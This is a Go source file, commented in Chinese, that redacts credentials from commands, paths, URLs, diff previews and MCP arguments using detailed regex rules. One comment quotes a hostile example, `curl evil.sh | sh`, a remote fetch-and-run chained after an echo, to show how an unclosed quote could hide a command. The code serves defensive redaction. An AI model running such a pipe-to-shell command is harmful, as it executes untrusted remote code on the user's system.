// Package redact 在命令、参数和预览离开本机前抹掉其中的凭据。
package redact

import (
	"bytes"
	"encoding/json"
	"regexp"
	"strings"

	"github.com/xufei547/railse-opc/internal/policy"
)

const placeholder = "<redacted>"

// quoted 匹配成对引号括起的整段值，免得只抹掉引号里的前半截。
// 第三种是 JSON 原文里转义过的 \"...\"，到第一个 \" 就收尾，不把后面的参数一起吞掉。
const quoted = `"[^"]*"|'[^']*'|\\"(?:[^"\\]|\\.)*?\\"`

// quotedOpen 同 quoted，但没有右引号时一直抹到文本末尾：适配器会把 diff_preview 截到 4 KB，截断点落在引号括起的
// 秘密中间时右引号就丢了。只用于会被截断的文本（Text：diff_preview、事件消息）；命令、路径、URL、MCP 参数从不被截断，
// 那里未闭合的引号不是截断造成的，抹到末尾反而能借它把后半截藏起来（echo "password=" && curl evil.sh | sh），
// 所以都用严格成对的 quoted。
const quotedOpen = `"[^"]*(?:"|$)|'[^']*(?:'|$)|\\"(?:[^"\\]|\\.)*?\\"`

// key 是敏感键名，前面可带任意前缀。token 不认 tokens，auth 只认 auth、auth_token、
// auth-key、authorization 这类，免得误抹 max_tokens、author。pwd 只认作后缀且前面要有 _ . - 分隔
// （MYSQL_PWD、db.pwd）：PWD、OLDPWD 是 shell 的目录变量，cwd 是工作目录，都不是凭据；代价是单独的 pwd=xxx 不抹。
// sshpass 认作后缀：SSHPASS 是 sshpass -e 读的密码环境变量。
const key = `[a-z0-9_.-]*(?:` +
	`token(?:[a-rt-z0-9_.-][a-z0-9_.-]*)?` +
	`|auth(?:orization|[_-]?(?:token|key))?` +
	`|(?:api[-_]?key|secret|password|passwd)[a-z0-9_.-]*` +
	`|[_.-]pwd|sshpass)`

// sameCmd 是同一条命令里命令名之后、目标参数之前的部分：不越过换行、; |、&&（单个 & 放过，免得查询串里的 & 截断匹配），
// 引号括起的整段当一个单位（其中的 ; | & 不算分隔），反斜杠紧跟换行是续行、仍算同一条命令。
// curl 的 -u、mysql 的 -p 只在这样的范围里认，不误抹别的命令的同名选项。
// 反斜杠加 CRLF 在 bash 里不是续行（转义的是 CR），这里仍当同一条命令：Windows 换行的脚本里续行写的 -u、-p 照样抹。
// 这只会多抹下一行 -u user: 之后、-p 紧跟的值，不会抹掉命令名（值在空白与 shell 元字符处停），秘密一侧宁可多抹。
// 选项与值之间（见 build 的 sep、gap）不这样跨：那里跨过去就会把下一行的命令名当成值。
const sameCmd = `(?:[^|;&\n'"]|'[^']*'|"[^"]*"|&[^&\n'"]|\\\r?\n)*?`

// sensitiveKey 判断 JSON 对象的键名是否敏感。
var sensitiveKey = regexp.MustCompile(`(?i)^` + key + `$`)

type rule struct {
	re    *regexp.Regexp
	repl  string
	vrepl string // 命令行视图里的替换文本（见 shell.go 的 applyView），只有 viewRules 用
	need  string // 能匹配的文本至少含其中一个字节；不含时跳过这条规则（只为快，不改结果）
}

// quoting 是一种语境里“引号怎么认”的写法。文本语境直接看原文；命令行语境看 shell.go 生成的视图，
// 视图里右引号换成了专用字节，正则因此只能从真正的左引号配到它自己的右引号，不会把右引号当左引号、跨过中间的命令配对。
type quoting struct {
	quoted   string // 引号括起的整段值
	jsonStr  string // JSON 字符串值
	keyEnd   string // JSON 键名的右引号
	sqUser   string // curl -u 单引号值：左引号和用户名
	sqPass   string // 单引号里的密码
	sqEnd    string // 单引号值的右引号（单独成组，替换时放回去）
	dqUser   string
	dqPass   string
	dqEnd    string
	jqEnd    string // JSON 原文里转义过的 \" 值的右引号
	user     string // curl -u 不带引号的用户名
	sameCmd  string
	cont     string // 反斜杠续行：同一条命令跨到下一行（真正的换行是命令分隔符，不算；\ 加 CRLF 在 bash 里也不是续行）
	urlUser  string // URL userinfo 的用户名
	urlPass  string // URL userinfo 的密码
	sshpass  string // sshpass 的命令名：文本语境认字面的 sshpass，命令行视图只认命令位置上的（见 shell.go 的 vCmd）
	excluded string // 视图专用字节，所有值字符类都排除（文本语境为空）
	ph       string // 已经抹过的占位符
	// word：值是整个词，引号段与值字符可以相连（"password":、'a'"b"），免得第一次只抹引号那段、第二次再连带后面的字符
	// （hub 二次脱敏结果要不变）。会被截断的文本不用
	word bool
	// sshpassArg：命令行视图里不在命令位置、按窄规则认的 sshpass（见 shell.go 的 vArg）；文本语境为空，不加这条规则
	sshpassArg string
	// sameLine：标志与值之间（--password 值、Bearer 值、Authorization: 值、"password": 值）只认同一行的空白与续行。
	// 命令行视图为 true：换行是命令分隔符，跨过去就会把下一行的命令名当成值抹掉；文本语境为 false，照旧用 \s
	sameLine bool
	// emptyQ 是空引号（''、""，命令行视图里还有 $''、$""）；quoted1 是至少含一个字符的引号段。sshpass 的 -p 紧贴的只是
	// 空引号时，bash 给的就是 -p，密码是下一个词（见 build 的 pAlt）
	emptyQ, quoted1 string
	// sshpassBase：sshpass 按 daf6f11 的口径认（小写 sshpass，左边不限，只跳过 sshpass 自己的选项），见 compile
	sshpassBase bool
	// noStart：值不能从这些字节开始，但可以穿过它们延续（命令行视图里是 sshpass 命令名的标记 vCmd、vArg，文本语境为空）。
	// sshpass 命令名本身不当 Bearer、--password 这类标志的值；值若从词里前面的部分开始（Bearer bin/sshpass），
	// 就一直抹到词尾，不在标记前断开（断开的话第二遍 <redacted>sshpass 不再是 sshpass，结果不同）
	noStart string
}

// textQuoting 是路径、文本、URL 等不经视图的语境：引号就是原文里的引号。open 为 true 时（只用于会被截断的文本）
// 引号括起的值没有右引号也认，一直抹到文本末尾，否则引号必须成对。
func textQuoting(open bool) quoting {
	q := quoting{
		quoted: quoted, jsonStr: `"(?:[^"\\]|\\.)*"`, keyEnd: `"`,
		sqUser: `('[^'":\s\\]*:)`, sqPass: `[^']*`, sqEnd: `(')`,
		dqUser: `("[^'":\s\\]*:)`, dqPass: `(?:[^"\\]|\\.)*`, dqEnd: `(")`,
		jqEnd: `(\\")`, user: `([^'":\s\\]*:)`, sameCmd: sameCmd, cont: `\\\n`,
		urlUser: `[^/\s:@'"\\]*`, urlPass: `[^\s/?#'"\\]+`, ph: placeholder,
		// 文本不执行，也没有命令位置可看：哪里出现都认，秘密一侧宁可多抹。命令名可以带引号（"sshpass"、'sshpass'），
		// 大小写不论（macOS 默认的文件系统不分大小写，SSHPASS 照样能执行）
		sshpass: `\b(?i:sshpass)['"]?`,
	}
	q.emptyQ, q.quoted1 = `''|""`, `"[^"]+"|'[^']+'|\\"(?:[^"\\]|\\.)+?\\"`
	if open {
		q.quoted, q.jsonStr = quotedOpen, `"(?:[^"\\]|\\.)*(?:"|$)`
		q.sqEnd, q.dqEnd, q.jqEnd = `('|$)`, `("|$)`, `(\\"|$)`
		q.quoted1 = `"[^"]+(?:"|$)|'[^']+(?:'|$)|\\"(?:[^"\\]|\\.)+?\\"`
	}
	return q
}

// compile 用给定的“不带引号的值”字符类编译一套文本语境的规则。几种语境只在值到哪里为止上不同。
// base 为 true 时 sshpass -p 按 daf6f11 的口径认：小写的 sshpass（\b 边界，左边不限），只跳过 sshpass 自己的选项
// （-f -d -P 带参数，-h -e -V -v），不认大小写变体、不跳 sshpass 不认的选项；-p 紧贴空引号的写法同样按 pAlt 处理。
// 用于引号里的字面文本、注释、JSON 叶子与 heredoc 正文：写进文件、交给 watch、rsync -e 的命令都在这里，密码要抹；
// 大写 SSHPASS、跳过别的工具的选项才找到的 -p 不认，免得把 env -u SSHPASS -u -p curl 这类的程序名当密码抹掉。
// 代价（与 daf6f11 相同）：小写 sshpass 是别的工具的选项值时（xargs -I sshpass -p curl），后面的词会被抹。
// 只给人看的 Text（事件消息、diff_preview）仍用完整规则
func compile(bare string, open, base bool) []rule {
	q := textQuoting(open)
	// 会被截断的文本不连：右引号丢了的值本来就抹到末尾，再连会把后面的引号也当成值的一部分
	q.word = !open
	if base {
		q.sshpass, q.sshpassBase = `\bsshpass`, true
	}
	return build(bare, q)
}

// build 编译一套规则。顺序很重要：先处理带键名的形式，再处理裸 token。bare 必须是 [^…]+ 形式的字符类。
//
// 值的位置上已经是占位符、且后面紧跟值字符类以外的字符（空白、引号……）或文本结尾时，只认占位符本身（连同那个字符原样
// 放回，见 ${phend}）：hub 会对守护进程脱敏过的载荷再跑一次，mysql -p<redacted> -pX 不能让规则跳到后面的 -p。
// 占位符后面还连着值字符时照原来的字符类整段抹，免得 password=<redacted>RealSecret 漏出后半截。
func build(bare string, q quoting) []rule {
	if !strings.HasPrefix(bare, "[^") || !strings.HasSuffix(bare, "]+") {
		panic("redact: bare 必须是 [^…]+ 形式的字符类: " + bare) // 下面 stop、unknownChar 按这个形状切出字符类的内容
	}
	stop := `[` + bare[2:len(bare)-2] + `]` // 值字符类以外的字符
	// bareStart 同 bare，只是第一个字节不能是 noStart；值的第一段都用它，后面延续的部分仍用 bare
	bareStart := `[^` + bare[2:len(bare)-2] + q.noStart + `][^` + bare[2:len(bare)-2] + `]*`
	// first 是值的第一段（引号段以外）：占位符加值字符，或者不以 noStart 开头的值字符
	first := `(?:` + q.ph + bare + `|` + bareStart + `)`
	// 选项与选项、选项与值之间只认同一行里的空白（空格、制表符）和反斜杠续行，不认换行：换行是命令分隔符，
	// sshpass -p 后面直接换行时 -p 没有参数，下一行是另一条命令，不能把它的命令名当密码抹掉。
	// sep 是词与词之间：至少一个空格或制表符（续行本身只是把两行接起来，x\⏎-p 是一个词 x-p）；gap 是选项与紧跟的值之间，可以没有
	sep := `(?:` + q.cont + `)*[ \t](?:[ \t]|` + q.cont + `)*`
	gap := `(?:[ \t]|` + q.cont + `)*`
	// fsep、fgap 是标志与值之间：文本语境是任意空白，命令行视图是同一行的空白与续行（sep 至少一个空格或制表符，gap 可以没有）
	fsep, fgap := `\s+`, `\s*`
	if q.sameLine {
		fsep, fgap = sep, gap
	}
	// sshpass 在 -p 之前的选项，取自 sshpass 1.06（getopt 串 "+f:d:p:P:heVv"，+ 模式只认程序名之前的选项）：带参数的 -f 文件、
	// -d 描述符、-P 提示词（参数紧贴或隔空白，可以是引号段），不带参数的 -h -e -V -v（可组合）；带参数的字母之后都是它的参数
	// （-fp 是文件 p，不是 -p）。macOS 的 getopt 把 + 也当成不带参数的选项（1.06 实测 -+ 照常执行），一并算进 fl。
	// 别的 - 开头的词（-o、-1、--foo、-v-）让 sshpass 1.06 报 illegal option 退出、什么都不执行（实测）：这样的词连同后面
	// 至多一个词（常见的是把 ssh 的 -o StrictHostKeyChecking=no 写到了 sshpass 上）都跳过，-p 的密码照样抹，命令行上的
	// 密码会进通知。单独的 - 是程序名、-- 结束选项，都不跳过；词里有被转义的字符（-\p 就是 -p）或 glob、花括号（展开结果
	// 拿不准）时也不跳过，只会漏抹、不会多抹。
	// “跳过的部分不会执行”只在 sshpass 确实是被执行的程序时成立：命令行视图里这条规则只从命令位置上的 sshpass 开始认
	// （shell.go 的 vCmd），别的工具参数里的 sshpass（env -u SSHPASS -u -p curl）后面的 -p 不是它的，后面的词可能正是程序。
	// 跳过的参数不脱敏；参数里可以有前面的规则刚插入的占位符（-o PasswordAuthentication=<redacted>），否则跳不过去、
	// 后面的 -p 就漏了
	fl := `[ehVv+]`
	optPiece := `(?:` + q.quoted + `|` + q.ph + `|` + bare + `)`
	optArg := optPiece + `+`
	unknownChar := `[^` + bare[2:len(bare)-2] + `\\\x00\x15ehVv+fdpP*?\[\]{}-]` // 不是已知选项字母、- 与拿不准的字符
	unknownOpt := `-(?:` + fl + `*` + unknownChar + `|` + fl + `+-|-` + optPiece + `)` + optPiece + `*`
	sshpassOpts := `(?:` + sep + `-` + fl + `*[fdP]` + gap + optArg + `|` + sep + `-` + fl + `+|` + sep + unknownOpt + `(?:` + sep + optArg + `)?)*`
	if q.sshpassBase {
		// daf6f11 的口径：只跳过 sshpass 自己的选项，不跳不认的选项，选项字母里没有 +
		fl = `[ehVv]`
		sshpassOpts = `(?:` + sep + `-` + fl + `*[fdP]` + gap + optArg + `|` + sep + `-` + fl + `+)*`
	}
	phOnly := q.ph + `(?P<phend>` + stop + `|$)`
	value := `(?:` + q.quoted + `|(?:` + phOnly + `|` + first + `))`
	if q.word {
		value = `(?:` + phOnly + `|(?:` + q.quoted + `|` + first + `)(?:` + q.quoted + `|` + bare + `)*)`
	}
	// sshpass 规则写成 `(… -p` + pCont + `)` + pAlt：第 1 组到 -p 与紧跟的续行为止。pAlt 要么是 -p 与值隔开，中间可以先有
	// 只含空引号的部分（bash 里 -p''、-p"" 就是 -p，密码是下一个词，与扫描器把 sshpass 当包装命令时的认法一致；-p'' 隔开的
	// '' 第 2 组原样放回）；要么值紧贴 -p，紧贴的值不能只是空引号（-p'' 后面没有别的字符时不抹任何东西）。紧贴的值也可以
	// 只是占位符（同 phOnly，紧跟的字符放进 phend2 放回）：-p\⏎<redacted> 再脱敏一次时不能退回去把续行本身当值
	attached := `(?:` + q.emptyQ + `)*(?:` + q.quoted1 + `|` + first + `)`
	if q.word {
		attached += `(?:` + q.quoted + `|` + bare + `)*`
	}
	attached = `(?:` + q.ph + `(?P<phend2>` + stop + `|$)|` + attached + `)`
	pCont := `(?:` + q.cont + `)*`
	pAlt := `(?:((?:` + q.emptyQ + `)*` + sep + `)` + value + `|` + attached + `)`
	bare = `(?:` + phOnly + `|` + first + `)`
	x := q.excluded
	rules := []rule{
		// Authorization: Bearer xxx / Authorization: Basic xxx
		{re: regexp.MustCompile(`(?i)(authorization:` + fgap + `)(bearer|basic|token)?` + fgap + bare), repl: "${1}" + placeholder + "${phend}", need: ":"},
		// 不跟在 Authorization: 后面的 Bearer xxx
		{re: regexp.MustCompile(`(?i)\b(bearer` + fsep + `)` + bare), repl: "${1}" + placeholder + "${phend}", need: "bB"},
		// --token xxx、--password "xxx"、--api-key 'xxx'
		{re: regexp.MustCompile(`(?i)(--?(token|password|passwd|api[-_]?key|secret|auth)` + fsep + `)` + value), repl: "${1}" + placeholder + "${phend}", need: "-"},
		// token=xxx、DB2_PASSWORD="xxx"、--env=DB_PASSWORD=xxx、+API_KEY=xxx、:_authToken=xxx、MYSQL_PWD=xxx。
		// 不设左边界：key 的前缀字符类会吸收键名前缀，${1} 只含键名本身。
		{re: regexp.MustCompile(`(?i)(` + key + `=)` + value), repl: "${1}" + placeholder + "${phend}", need: "="},
		// JSON 带引号的敏感键："password": "xxx"、"api_key": 123、"auth_token": true。值换成 "<redacted>"，JSON 仍合法；
		// open 时字符串值没有右引号（被截断）也抹到文本末尾。YAML 的裸键（password: xxx）不认
		{re: regexp.MustCompile(`(?i)("` + key + q.keyEnd + fgap + `:` + fgap + `)(?:` + q.jsonStr + `|-?[0-9][0-9.eE+-]*|true|false)`),
			repl: "${1}\"" + placeholder + "\"", vrepl: "${1}\"" + viewPlaceholder + string(rune(vCloseDQ)), need: ":"},
		// X-API-Key: xxx、PRIVATE-TOKEN: xxx、X-Auth-Token:xxx 这类请求头（Authorization 见上）。头名要带连字符，
		// 免得误抹代码里的 apiKey: config.key、YAML 里的 max_tokens: 10
		{re: regexp.MustCompile(`(?i)\b((?:[a-z0-9]+-)*(?:api-key|[a-z0-9]+-token|[a-z0-9]+-secret)[ \t]*:[ \t]*)` + value), repl: "${1}" + placeholder + "${phend}", need: ":"},
		// URL 里的 user:pass@（任意 scheme）：用户名留着，只抹密码。密码里的 @ 算在密码里（取 / ? # 之前最后一个 @）
		{re: regexp.MustCompile(`(?i)\b([a-z][a-z0-9+.-]*://` + q.urlUser + `:)` + q.urlPass + `@`), repl: "${1}" + placeholder + "@", need: ":"},
		// curl 的 -u/--user、-U/--proxy-user 的 user:pass（-u、-U 可以在组合短选项末尾，如 -sSu）：用户名与引号留着，
		// 只抹密码；不带冒号的（curl 会提示输入密码）不动。整段带引号的（'user:pass'、"user:pass"）引号要成对（open 时允许
		// 缺右引号），双引号里认转义的 \"；用户名不带引号时密码与别的值一样，可以是引号段（user:'pass'），整个词抹成占位符
		{re: regexp.MustCompile(`(\bcurl\b` + q.sameCmd + sep + `(?:-[A-Za-z]*[uU]` + gap + `|--user` + sep + `|--proxy-user` + sep + `))` +
			`(?:` + q.sqUser + q.sqPass + q.sqEnd + `|` + q.dqUser + q.dqPass + q.dqEnd +
			`|(\\"[^'":\s\\` + x + `]*:)(?:[^"\\` + x + `]|\\[^"` + x + `])*` + q.jqEnd + `|` + q.user + value + `)`),
			repl: "${1}${2}${4}${6}${8}" + placeholder + "${phend}${3}${5}${7}", need: "-"},
		// mysql 系命令紧贴 -p 的密码（-pxxx、-p'xxx'）。-p 单独出现时 mysql 提示输入密码、后面的是库名；-P 是端口：都不动
		{re: regexp.MustCompile(`(\b(?:mysql|mariadb)[a-z-]*` + q.sameCmd + `\s-p)` + value), repl: "${1}" + placeholder + "${phend}", need: "-"},
	}
	if q.sshpass != "" {
		// sshpass 的 -p 密码（-p pw、-p 'pw'、-p'pw'、-ppw，-p 可以在 -v 这类选项之后或组合在末尾，如 -vp）。只认 sshpass
		// 自己的选项里的 -p：后面 ssh、scp、rsync 自己的 -p（端口、保留权限）不动。命令行视图里这条完整规则只认命令位置上的
		// sshpass（行首、; | && ( $( 之后、VAR=值 之后、sudo env timeout nohup exec xargs 等包装命令之后，见 shell.go 的 endWord），
		// 别的位置见下一条窄规则；引号里的字面文本、JSON 叶子与 heredoc 正文用 daf6f11 的口径（见 compile 的 base）
		rules = append(rules, rule{re: regexp.MustCompile(`(` + q.sshpass + sshpassOpts + sep + `-` + fl + `*p` + pCont + `)` + pAlt), repl: "${1}${2}" + placeholder + "${phend}${phend2}", need: "-"})
	}
	if q.sshpassArg != "" {
		// 命令行视图里不在命令位置的 sshpass（扫描器不认的前缀之后：ssh jump sshpass -p pw、docker exec ctr sshpass -p pw、
		// watch sshpass -p pw）：只认小写、不带引号的 sshpass 紧跟 -p（-p 值、-p值，中间不跳任何选项），且前一个词不是选项
		// （shell.go 的 vArg）。xargs -I sshpass -p curl、docker run -e sshpass -p 8080:80 里 sshpass 是选项的值，不认；
		// 代价是 echo sshpass -p x 这类参数会多抹一个词，多抹的是参数，不藏命令
		rules = append(rules, rule{re: regexp.MustCompile(`(` + q.sshpassArg + sep + `-p` + pCont + `)` + pAlt), repl: "${1}${2}" + placeholder + "${phend}${phend2}", need: "-"})
	}
	// 裸 token：GitHub、OpenAI、Slack、AWS
	return append(rules, rule{re: regexp.MustCompile(`\b(ghp_|gho_|ghs_|github_pat_|sk-|xox[abp]-|AKIA)[A-Za-z0-9_\-]{16,}\b`), repl: placeholder, need: "_-A"})
}

var (
	// literalRules 用于命令行里元字符是普通字符的片段（引号里、注释，见 shell.go）：值只在空白、引号、反斜杠处停，
	// 免得引号括住整个 KEY=值 时（"POSTGRES_PASSWORD=Xy7&kP(2)q"）强密码只抹掉前半截。排除反斜杠是为了处理 JSON 原文时
	// 不吞掉 \" 转义，结果仍是合法 JSON。
	literalRules = compile(`[^\s'"\\]+`, false, true)
	// textRules 用于路径、JSON 字符串叶子和 heredoc 正文：没有 shell 语义，值一直抹到空白或引号，
	// 免得含 & ( ; | 等符号的强密码只抹掉前半截。它们不会被截断，引号严格成对。
	textRules = compile(`[^\s'"]+`, false, true)
	// truncRules 同 textRules，用于会被截断的文本（Text：diff_preview、事件消息）：未闭合的引号抹到末尾，见 quotedOpen。
	truncRules = compile(`[^\s'"]+`, true, false)
	// urlRules 用于 URL：值在 & 处停，保留后面的查询参数。
	urlRules = compile(`[^\s'"&]+`, false, false)
)

// redact 按给定规则集返回脱敏后的副本。
func redact(s string, rules []rule) string {
	out := s
	for _, r := range rules {
		if strings.ContainsAny(out, r.need) {
			out = r.re.ReplaceAllString(out, r.repl)
		}
	}
	return out
}

// String 按命令行语境返回脱敏后的副本，见 shell.go：裸值在 shell 元字符处停；引号里、注释与 heredoc 正文按字面整段抹；
// 交给 sh -c、eval、ssh 执行的参数和喂给它们的 heredoc 正文按命令行语境递归处理。
func String(s string) string {
	return shellString(s)
}

// Text 按普通文本语境返回脱敏后的副本，规则与 DiffPreview 相同：值一直抹到空白或引号；文本可能被截断，
// 未闭合的引号抹到末尾（见 quotedOpen）。用于事件消息这类可能夹带命令原文的自由文本。
func Text(s string) string {
	return redact(s, truncRules)
}

// Payload 对载荷里可能含凭据的字段脱敏，返回副本。每个字段按自己的语境处理。
func Payload(p policy.Payload) policy.Payload {
	out := p
	out.Command = String(p.Command)
	out.Path = redact(p.Path, textRules)
	out.DiffPreview = Text(p.DiffPreview)
	out.URL = redact(p.URL, urlRules)
	if len(p.Args) > 0 {
		out.Args = args(p.Args)
	}
	return out
}

// args 对 MCP 参数脱敏。合法 JSON 按结构处理，结果仍是合法 JSON；否则按命令行语境当字符串处理。
func args(raw json.RawMessage) json.RawMessage {
	if json.Valid(raw) {
		dec := json.NewDecoder(bytes.NewReader(raw))
		dec.UseNumber() // 保住大整数的精度
		var v any
		if dec.Decode(&v) == nil {
			var buf bytes.Buffer
			enc := json.NewEncoder(&buf)
			enc.SetEscapeHTML(false) // 让 <redacted> 原样可读
			if enc.Encode(walk(v)) == nil {
				return bytes.TrimSuffix(buf.Bytes(), []byte("\n"))
			}
		}
	}
	return json.RawMessage(String(string(raw)))
}

// shellValueKey 是 MCP 参数里装 shell 命令的键名：这些值是会被执行的命令，按命令行语境脱敏，
// 让裸值在 shell 元字符处停下，后半截命令露出来（第 4 份终审 m-4）。
var shellValueKey = regexp.MustCompile(`(?i)^(command|cmd|script|shell_command|bash|sh)$`)

// shellArgsKey 是与命令键同级、装命令参数的键名：命令键的值是 shell 解释器时，这些数组的元素是交给 shell 的参数
// （{"command":"bash","args":["-c","…"]}），同样按命令行语境。
var shellArgsKey = regexp.MustCompile(`(?i)^(args|argv|arguments)$`)

// walk 递归处理 JSON 值：敏感键的值整体抹掉，装命令的键按命令行语境（见 commandValue），命令键是 shell 解释器时同级的
// args、argv、arguments 数组也按命令行语境，其余字符串按普通文本逐个脱敏。嵌套对象与数组里同样生效。
func walk(v any) any {
	switch x := v.(type) {
	case map[string]any:
		shellArgs := runsShell(x)
		for k, e := range x {
			_, isArray := e.([]any)
			switch {
			case sensitiveKey.MatchString(k):
				x[k] = placeholder
			case shellValueKey.MatchString(k), shellArgs && isArray && shellArgsKey.MatchString(k):
				x[k] = commandValue(e)
			default:
				x[k] = walk(e)
			}
		}
	case []any:
		for i, e := range x {
			x[i] = walk(e)
		}
	case string:
		return redact(x, textRules)
	}
	return v
}

// commandValue 处理装命令的值：字符串按命令行语境；argv 数组（["sh","-c","…"]）的字符串元素逐个按命令行语境，
// 别的元素照旧 walk；对象等其余值照旧 walk。
func commandValue(v any) any {
	switch x := v.(type) {
	case string:
		return String(x)
	case []any:
		for i, e := range x {
			if s, ok := e.(string); ok {
				x[i] = String(s)
			} else {
				x[i] = walk(e)
			}
		}
		return x
	}
	return walk(v)
}

// runsShell 报告对象里是否有命令键的值是 shell 解释器：sh、bash、zsh、dash、ksh（与 shell.go 认的一样），
// 可带路径（/bin/bash）、前后空白和一层成对的引号（"bash"、'/bin/zsh'）。
func runsShell(m map[string]any) bool {
	for k, e := range m {
		s, ok := e.(string)
		if !ok || !shellValueKey.MatchString(k) {
			continue
		}
		s = strings.TrimSpace(s)
		if n := len(s); n >= 2 && (s[0] == '"' || s[0] == '\'') && s[n-1] == s[0] {
			s = s[1 : n-1]
		}
		if isShellName(s[strings.LastIndexByte(s, '/')+1:]) {
			return true
		}
	}
	return false
}
